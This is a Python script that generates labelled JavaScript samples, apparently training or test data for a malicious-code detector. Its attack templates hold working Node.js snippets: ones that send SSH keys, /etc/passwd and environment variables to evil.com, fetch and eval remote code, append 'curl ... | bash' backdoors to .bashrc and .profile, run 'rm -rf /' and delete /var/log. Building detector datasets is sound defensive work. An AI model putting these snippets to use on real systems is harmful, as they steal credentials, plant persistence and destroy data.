#!/usr/bin/env python3
"""
Round 20 - JavaScript 恶意样本生成器

生成 50+ JS 恶意样本，覆盖 10 种攻击类型
"""

import os
from pathlib import Path

# 攻击模板
ATTACK_TEMPLATES = {
    'command_execution': [
        """// Command Execution - Variant {variant}
const {{ exec }} = require('child_process');
const cmd = process.argv[2] || 'whoami';
exec(cmd, (err, stdout, stderr) => {{
    console.log(stdout);
}});
""",
        """// Command Execution - Sync Variant {variant}
const {{ execSync }} = require('child_process');
const result = execSync('id', {{ encoding: 'utf-8' }});
console.log(result);
""",
        """// Command Execution - Spawn Variant {variant}
const {{ spawn }} = require('child_process');
const ls = spawn('ls', ['-la']);
ls.stdout.on('data', (data) => {{
    console.log(`OUTPUT: ${{data}}`);
}});
""",
    ],
    
    'code_injection': [
        """// Code Injection - Eval Variant {variant}
const userInput = process.argv[2];
eval(userInput);
""",
        """// Code Injection - Function Variant {variant}
const code = "console.log('Injected')";
const fn = new Function(code);
fn();
""",
        """// Code Injection - setTimeout Variant {variant}
const malicious = "require('child_process').exec('rm -rf /')";
setTimeout(malicious, 100);
""",
        """// Code Injection - setInterval Variant {variant}
setInterval("console.log('Malicious interval')", 1000);
""",
    ],
    
    'data_exfiltration': [
        """// Data Exfiltration - HTTP POST Variant {variant}
const fs = require('fs');
const http = require('http');
const sensitive = fs.readFileSync('/etc/passwd', 'utf-8');
http.post('http://evil.com/collect', sensitive);
""",
        """// Data Exfiltration - Fetch Variant {variant}
const fs = require('fs');
const data = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf-8');
fetch('http://evil.com/steal', {{
    method: 'POST',
    body: data
}});
""",
        """// Data Exfiltration - Axios Variant {variant}
const fs = require('fs');
const axios = require('axios');
const env = JSON.stringify(process.env);
axios.post('http://evil.com/env', {{ env }});
""",
    ],
    
    'remote_code_execution': [
        """// Remote Code Execution - HTTP Eval Variant {variant}
const http = require('http');
http.get('http://evil.com/malware.js', (res) => {{
    let code = '';
    res.on('data', chunk => code += chunk);
    res.on('end', () => eval(code));
}});
""",
        """// Remote Code Execution - Fetch Eval Variant {variant}
fetch('http://evil.com/payload.js')
    .then(res => res.text())
    .then(code => eval(code));
""",
        """// Remote Code Execution - HTTPS Variant {variant}
const https = require('https');
https.get('https://evil.com/backdoor.js', (res) => {{
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => new Function(data)());
}});
""",
    ],
    
    'file_manipulation': [
        """// File Manipulation - Write System File Variant {variant}
const fs = require('fs');
const malicious = '#!/bin/bash\\ncurl http://evil.com/backdoor.sh | bash';
fs.writeFileSync(process.env.HOME + '/.bashrc', malicious, {{ flag: 'a' }});
""",
        """// File Manipulation - Delete Files Variant {variant}
const fs = require('fs');
fs.unlinkSync('/etc/important_config');
fs.rmSync('/var/log', {{ recursive: true, force: true }});
""",
        """// File Manipulation - Read Sensitive Variant {variant}
const fs = require('fs');
const passwd = fs.readFileSync('/etc/passwd', 'utf-8');
const shadow = fs.readFileSync('/etc/shadow', 'utf-8');
console.log(passwd, shadow);
""",
    ],
    
    'persistence': [
        """// Persistence - Bashrc Variant {variant}
const fs = require('fs');
const path = require('path');
const bashrc = path.join(process.env.HOME, '.bashrc');
fs.appendFileSync(bashrc, '\\n# Backdoor\\ncurl http://evil.com/hook.sh | bash\\n');
""",
        """// Persistence - Profile Variant {variant}
const fs = require('fs');
const profile = process.env.HOME + '/.profile';
fs.writeFileSync(profile, fs.readFileSync(profile) + '\\neval $(curl -s http://evil.com/init)\\n');
""",
    ],
    
    'credential_theft': [
        """// Credential Theft - Environment Variables Variant {variant}
const http = require('http');
const env = JSON.stringify(process.env);
http.post('http://evil.com/steal', {{ body: env }});
""",
        """// Credential Theft - SSH Keys Variant {variant}
const fs = require('fs');
const path = require('path');
const sshDir = path.join(process.env.HOME, '.ssh');
const keys = {{
    id_rsa: fs.readFileSync(path.join(sshDir, 'id_rsa'), 'utf-8'),
    id_ed25519: fs.readFileSync(path.join(sshDir, 'id_ed25519'), 'utf-8')
}};
require('axios').post('http://evil.com/keys', keys);
""",
    ],
    
    'obfuscation': [
        """// Obfuscation - Hex Variables Variant {variant}
var _0x5a2b = ['eval', 'exec', 'require'];
var _eval = window[_0x5a2b[0]];
var _require = global[_0x5a2b[2]];
var child = _require('child_process');
child[_0x5a2b[1]]('whoami');
""",
        """// Obfuscation - Base64 Variant {variant}
const code = atob('Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7IGV4ZWMoJ3dob2FtaScpOw==');
eval(code);
""",
        """// Obfuscation - Hex String Variant {variant}
const cmd = "\\x65\\x76\\x61\\x6c";  // "eval"
const code = "\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x2e\\x6c\\x6f\\x67\\x28\\x27\\x48\\x65\\x6c\\x6c\\x6f\\x27\\x29";
global[cmd](code);
""",
    ],
    
    'prototype_pollution': [
        """// Prototype Pollution - Direct Variant {variant}
const obj = {{}};
obj.__proto__.isAdmin = true;
console.log({}.isAdmin);  // true
""",
        """// Prototype Pollution - Function Variant {variant}
function pollute(obj, path, value) {{
    const parts = path.split('.');
    let current = obj;
    for (let i = 0; i < parts.length - 1; i++) {{
        current = current[parts[i]] || (current[parts[i]] = {{}});
    }}
    current[parts[parts.length - 1]] = value;
}}
pollute({{}}, '__proto__.polluted', true);
""",
    ],
    
    'reconnaissance': [
        """// Reconnaissance - System Info Variant {variant}
const os = require('os');
const info = {{
    platform: os.platform(),
    arch: os.arch(),
    hostname: os.hostname(),
    user: os.userInfo().username,
    cpus: os.cpus().length,
    memory: os.totalmem()
}};
require('axios').post('http://evil.com/recon', info);
""",
        """// Reconnaissance - Network Info Variant {variant}
const os = require('os');
const interfaces = os.networkInterfaces();
const fs = require('fs');
const hosts = fs.readFileSync('/etc/hosts', 'utf-8');
require('axios').post('http://evil.com/network', {{ interfaces, hosts }});
""",
    ],
}

# 安全代码模板
SAFE_TEMPLATES = [
    """// Safe Code - Math Utility
function add(a, b) {{
    return a + b;
}}

function multiply(a, b) {{
    return a * b;
}}

console.log(add(2, 3));
console.log(multiply(4, 5));
""",
    """// Safe Code - String Utility
function reverse(str) {{
    return str.split('').reverse().join('');
}}

function capitalize(str) {{
    return str.charAt(0).toUpperCase() + str.slice(1);
}}

console.log(reverse('hello'));
""",
    """// Safe Code - Array Utility
function sum(arr) {{
    return arr.reduce((a, b) => a + b, 0);
}}

function average(arr) {{
    return sum(arr) / arr.length;
}}

console.log(sum([1, 2, 3, 4, 5]));
""",
    """// Safe Code - Object Utility
function clone(obj) {{
    return JSON.parse(JSON.stringify(obj));
}}

function keys(obj) {{
    return Object.keys(obj);
}}

console.log(clone({{ a: 1, b: 2 }}));
""",
    """// Safe Code - HTTP Client (Safe Usage)
const https = require('https');

https.get('https://api.github.com', (res) => {{
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => console.log(JSON.parse(data)));
}});
""",
    """// Safe Code - File Reader (Safe Usage)
const fs = require('fs');
const path = require('path');

function readConfig() {{
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {{
        return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    }}
    return {{}};
}}

console.log(readConfig());
""",
]


def generate_samples(output_dir: str, variants_per_type: int = 5):
    """生成恶意样本"""
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    count = 0
    
    for attack_type, templates in ATTACK_TEMPLATES.items():
        print(f"\n📝 Generating {attack_type} samples...")
        
        for i, template in enumerate(templates):
            for variant in range(variants_per_type):
                code = template.format(variant=variant + 1)
                
                # 添加一些变体
                if variant % 2 == 0:
                    code = code.replace('console.log', '// log\nconsole.log')
                if variant % 3 == 0:
                    code = code + f"\n// Variant {variant + 1}\n"
                
                filename = f"{attack_type}_{i:02d}_v{variant + 1:02d}.js"
                filepath = output_path / filename
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(code)
                
                count += 1
    
    print(f"\n✅ Generated {count} malicious samples in {output_dir}")
    return count


def generate_safe_samples(output_dir: str):
    """生成安全样本"""
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    count = 0
    for i, template in enumerate(SAFE_TEMPLATES):
        for variant in range(3):
            code = template.format()
            if variant > 0:
                code = code + f"\n// Safe variant {variant + 1}\n"
            
            filename = f"safe_utility_{i:02d}_v{variant + 1:02d}.js"
            filepath = output_path / filename
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(code)
            
            count += 1
    
    print(f"✅ Generated {count} safe samples in {output_dir}")
    return count


if __name__ == '__main__':
    print("=" * 60)
    print("🚀 Round 20 - JavaScript Sample Generator")
    print("=" * 60)
    
    base_dir = Path(__file__).parent.parent / "samples"
    
    # 生成恶意样本
    malicious_count = generate_samples(base_dir / "js_malicious", variants_per_type=5)
    
    # 生成安全样本
    safe_count = generate_safe_samples(base_dir / "js_safe")
    
    print("\n" + "=" * 60)
    print(f"📊 Summary")
    print(f"   Malicious samples: {malicious_count}")
    print(f"   Safe samples: {safe_count}")
    print(f"   Total: {malicious_count + safe_count}")
    print("=" * 60)
